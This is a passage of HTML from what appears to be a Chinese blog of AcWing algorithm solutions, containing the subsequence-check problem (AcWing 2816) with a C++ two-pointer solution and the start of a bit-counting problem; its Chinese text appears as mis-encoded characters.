class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>, j = m - <span class="number">1</span>; i &lt; n; i++) &#123;</span><br><span class="line">    <span class="keyword">while</span> (a[i] + b[j] &gt; x) j--;</span><br><span class="line">    <span class="keyword">if</span> (a[i] + b[j] == x) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;%d %d\n&quot;</span>, i, j);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="AcWing-2816-åˆ¤æ–­å­åºåˆ—"><a href="https://www.acwing.com/problem/content/2818/">AcWing 2816. åˆ¤æ–­å­åºåˆ—</a></h2><p>ç»™å®šä¸€ä¸ªé•¿åº¦ä¸º <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> çš„æ•´æ•°åºåˆ— <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>a</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>a</mi><mn>2</mn></msub><mo separator="true">,</mo><mo>â€¦</mo><mo separator="true">,</mo><msub><mi>a</mi><mi>n</mi></msub></mrow><annotation encoding="application/x-tex">a_1,a_2,â€¦,a_n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner">â€¦</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> ä»¥åŠä¸€ä¸ªé•¿åº¦ä¸º <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">m</span></span></span></span> çš„æ•´æ•°åºåˆ— <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>b</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>b</mi><mn>2</mn></msub><mo separator="true">,</mo><mo>â€¦</mo><mo separator="true">,</mo><msub><mi>b</mi><mi>m</mi></msub></mrow><annotation encoding="application/x-tex">b_1,b_2,â€¦,b_m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner">â€¦</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">m</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>ã€‚</p><p>è¯·ä½ åˆ¤æ–­ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi></mrow><annotation encoding="application/x-tex">a</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">a</span></span></span></span> åºåˆ—æ˜¯å¦ä¸º <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>b</mi></mrow><annotation encoding="application/x-tex">b</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">b</span></span></span></span> åºåˆ—çš„å­åºåˆ—ã€‚</p><p>å­åºåˆ—æŒ‡åºåˆ—çš„ä¸€éƒ¨åˆ†é¡¹æŒ‰<strong>åŸæœ‰æ¬¡åºæ’åˆ—</strong>è€Œå¾—çš„åºåˆ—ï¼Œä¾‹å¦‚åºåˆ— <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>a</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>a</mi><mn>3</mn></msub><mo separator="true">,</mo><msub><mi>a</mi><mn>5</mn></msub></mrow><annotation encoding="application/x-tex">{a_1,a_3,a_5}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">5</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></span> æ˜¯åºåˆ— <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>a</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>a</mi><mn>2</mn></msub><mo separator="true">,</mo><msub><mi>a</mi><mn>3</mn></msub><mo separator="true">,</mo><msub><mi>a</mi><mn>4</mn></msub><mo separator="true">,</mo><msub><mi>a</mi><mn>5</mn></msub></mrow><annotation encoding="application/x-tex">{a_1,a_2,a_3,a_4,a_5}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">4</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">5</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></span> çš„ä¸€ä¸ªå­åºåˆ—ã€‚</p><p><strong>è¾“å…¥æ ¼å¼</strong></p><p>ç¬¬ä¸€è¡ŒåŒ…å«ä¸¤ä¸ªæ•´æ•° <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mo separator="true">,</mo><mi>m</mi></mrow><annotation encoding="application/x-tex">n,m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">n</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">m</span></span></span></span>ã€‚</p><p>ç¬¬äºŒè¡ŒåŒ…å« <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> ä¸ªæ•´æ•°ï¼Œè¡¨ç¤º <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>a</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>a</mi><mn>2</mn></msub><mo separator="true">,</mo><mo>â€¦</mo><mo separator="true">,</mo><msub><mi>a</mi><mi>n</mi></msub></mrow><annotation encoding="application/x-tex">a_1,a_2,â€¦,a_n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner">â€¦</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>ã€‚</p><p>ç¬¬ä¸‰è¡ŒåŒ…å« <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">m</span></span></span></span> ä¸ªæ•´æ•°ï¼Œè¡¨ç¤º <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>b</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>b</mi><mn>2</mn></msub><mo separator="true">,</mo><mo>â€¦</mo><mo separator="true">,</mo><msub><mi>b</mi><mi>m</mi></msub></mrow><annotation encoding="application/x-tex">b_1,b_2,â€¦,b_m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner">â€¦</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">m</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>ã€‚</p><p><strong>è¾“å‡ºæ ¼å¼</strong></p><p>å¦‚æœ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi></mrow><annotation encoding="application/x-tex">a</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">a</span></span></span></span> åºåˆ—æ˜¯ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>b</mi></mrow><annotation encoding="application/x-tex">b</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">b</span></span></span></span> åºåˆ—çš„å­åºåˆ—ï¼Œè¾“å‡ºä¸€è¡Œ <code>Yes</code>ã€‚</p><p>å¦åˆ™ï¼Œè¾“å‡º <code>No</code>ã€‚</p><p><strong>æ•°æ®èŒƒå›´</strong></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>â‰¤</mo><mi>n</mi><mo>â‰¤</mo><mi>m</mi><mo>â‰¤</mo><mn>1</mn><msup><mn>0</mn><mn>5</mn></msup></mrow><annotation encoding="application/x-tex">1 \le n \le m \le 10^5</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7719em;vertical-align:-0.136em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7719em;vertical-align:-0.136em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8141em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">5</span></span></span></span></span></span></span></span></span></span></span>,<br><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>âˆ’</mo><mn>1</mn><msup><mn>0</mn><mn>9</mn></msup><mo>â‰¤</mo><msub><mi>a</mi><mi>i</mi></msub><mo separator="true">,</mo><msub><mi>b</mi><mi>i</mi></msub><mo>â‰¤</mo><mn>1</mn><msup><mn>0</mn><mn>9</mn></msup></mrow><annotation encoding="application/x-tex">-10^9 \le a_i,b_i \le 10^9</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9501em;vertical-align:-0.136em;"></span><span class="mord">âˆ’</span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">9</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8141em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">9</span></span></span></span></span></span></span></span></span></span></span></p><p><strong>è¾“å…¥æ ·ä¾‹ï¼š</strong></p><pre><code>3 51 3 51 2 3 4 5</code></pre><p><strong>è¾“å‡ºæ ·ä¾‹ï¼š</strong></p><pre><code>Yes</code></pre><h3 id="åŒæŒ‡é’ˆ-2">åŒæŒ‡é’ˆ</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> kN = <span class="number">1e5</span> + <span class="number">10</span>;</span><br><span class="line"><span class="type">int</span> a[kN], b[kN];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> n, m;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;n, &amp;m);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;a[i]);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; i++) <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;b[i]);</span><br><span class="line">  </span><br><span class="line">  <span class="type">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> (i &lt; n &amp;&amp; j &lt; m) &#123;</span><br><span class="line">    <span class="keyword">if</span> (a[i] == b[j]) i++;</span><br><span class="line">    j++;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (i == n) &#123;  <span class="comment">// çœ‹çŸ­çš„</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Yes\n&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;No\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="ä½è¿ç®—">ä½è¿ç®—</h1><h2 id="AcWing-801-äºŒè¿›åˆ¶ä¸­1çš„ä¸ªæ•°"><a href="https://www.acwing.com/problem/content/803/">AcWing 801. äºŒè¿›åˆ¶ä¸­1çš„ä¸ªæ•°</a></h2><p>ç»™å®šä¸€ä¸ªé•¿åº¦ä¸º <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> çš„æ•°åˆ—ï¼Œè¯·ä½ æ±‚å‡ºæ•°åˆ—ä¸­æ¯ä¸ªæ•°çš„äºŒè¿›åˆ¶è¡¨ç¤ºä¸­ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn></mrow><annotation encoding="application/x-tex">1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span> çš„ä¸ªæ•°ã€‚</p><p><strong>è¾“å…¥æ ¼å¼</strong></p><p>ç¬¬ä¸€è¡ŒåŒ…å«æ•´æ•° <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span>ã€‚</p><p>ç¬¬äºŒè¡ŒåŒ…å« <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> ä¸ªæ•´æ•°ï¼Œè¡¨ç¤ºæ•´ä¸ªæ•°åˆ—ã€‚</p><p><strong>è¾“å‡ºæ ¼å¼</strong></p><p>å…±ä¸€è¡Œï¼ŒåŒ…å« <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> ä¸ªæ•´æ•°ï¼Œå…¶ä¸­çš„ç¬¬ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6595em;"></span><span class="mord mathnormal">i</span></span></span></span> ä¸ªæ•°è¡¨ç¤ºæ•°åˆ—ä¸­çš„ç¬¬ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6595em;"></span><span class="mord mathnormal">i</span></span></span></span> ä¸ªæ•°çš„äºŒè¿›åˆ¶è¡¨ç¤ºä¸­ <span class="katex"><span 